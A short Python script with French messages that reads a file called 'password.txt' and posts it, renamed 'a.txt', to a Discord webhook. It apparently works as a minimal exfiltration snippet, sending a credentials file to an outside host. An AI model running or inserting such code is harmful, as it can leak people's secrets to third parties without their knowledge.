import requests
import os

WEBHOOK_URL =  os.environ["DISCORD_WEBHOOK_URL"]
FILE_PATH = "password.txt"

with open(FILE_PATH, "rb") as file:
    response = requests.post(
        WEBHOOK_URL,
        files={"file": ("a.txt", file, "text/plain")}
    )

if response.ok:
    print("Fichier envoyé avec succès.")
else:
    print(f"Échec de l'envoi : HTTP {response.status_code}")
    print(response.text)